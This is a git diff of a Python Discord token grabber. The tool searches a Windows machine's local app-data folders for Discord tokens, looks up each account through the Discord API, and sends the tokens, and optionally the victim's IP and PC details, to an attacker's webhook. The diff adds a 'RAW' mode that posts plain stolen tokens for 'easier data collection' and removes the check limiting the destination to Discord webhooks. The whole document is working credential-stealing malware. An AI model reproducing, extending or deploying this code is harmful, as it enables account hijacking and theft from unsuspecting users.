@@ -1,21 +1,24 @@
 # CONFIGURATION:
 # your webhook URL
 WEBHOOK_URL = 'WEBHOOK HERE'
+
 # determines what information you wanna send
+# none of this works in RAW
 SEND_IP = False
 SEND_PC_INFO = False
 # mentions you when you get a hit
 PING_ME = False
+
+
 # Style of the webhook message
-# TEXT , EMBED
-MODE = 'TEXT'
-# only for development purposes
-EXPERIMENTAL= False
+# Made for Discord : TEXT , EMBED
+# Custom : RAW (just sending plain text token, easier data collection)
+MODE = 'EMBED'
 
 '''
 CHANGELOG:
-- added embed support
-- added getPremiumType() function
+- added RAW mode
+- made code easier to read
 '''
 
 
@@ -27,11 +30,12 @@ import json
 import random
 import platform
 
+# checking for non builtin libraries
 try:
     import requests
 except:
-    print("requests module not found")
-    raise Exception
+    print("some libraries could not be found")
+    raise
 # if system is not Windows quit 
 if not platform.system() == 'Windows':
     raise OSError
@@ -52,12 +56,14 @@ def find_tokens(path):
     return tokens
 
 def getUserInfo(token):
+    # returns the response from the discord api
+    # https://discord.com/developers/docs/resources/user#get-current-user
     return json.loads(requests.get('https://discord.com/api/v9/users/@me',headers={"Authorization": token,'Content-Type': 'application/json',
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}).text)
 
 def getIP():
     url = "https://api.ipify.org/"
-    response = requests.request("GET", url)
+    response = requests.get(url)
     return response.text
 
 def getPcInfo():
@@ -69,13 +75,15 @@ def getPcInfo():
     return userinfo
 
 def getPremiumType(user_data):
+    # https://discord.com/developers/docs/resources/user#user-object-premium-types
+    # returns the premium type in a human readable way
     try:
         if user_data['premium_type'] == 0:
             nitro = 'None'
         elif user_data['premium_type'] == 1:
-            nitro = 'Nitro Classic'
+            nitro = 'Nitro Classic ($5)'
         elif user_data['premium'] == 2:
-            nitro = 'Nitro'
+            nitro = 'Nitro ($10)'
     except:
         nitro = 'None'
 
@@ -84,12 +92,8 @@ def getPremiumType(user_data):
 
 def main():
     # check if webhook url was filled in
-    # or is a webhook url
     if WEBHOOK_URL == 'WEBHOOK HERE':
         print("Please add a webhook URL")
-        raise Exception
-    elif not WEBHOOK_URL.startswith('https://discord.com/api/webhooks/'):
-        print("This is not a discord webhook URL")
         raise Exception
 
     local = os.getenv('LOCALAPPDATA')
@@ -202,7 +206,23 @@ def main():
         #print(message)
         response = requests.post(WEBHOOK_URL,headers=headers,data=payload.encode())
         #print(response.text)
+    elif MODE == 'RAW':
+        for platform, path in paths.items():
+            if not os.path.exists(path):
+                continue
+
+            tokens = find_tokens(path)
+
+            if len(tokens) > 0:
+                for token in tokens:
+                    try:
+                        raw_user = getUserInfo(token)
+                        requests.post(WEBHOOK_URL,data=token)
+                        #print(raw_user)
+                    except:
+                        pass
+                        #print('This token does not work')
     else:
-        print('MODE invalid or experimental is not enabled')
+        print('MODE invalid')
 if __name__ == '__main__':
     main()
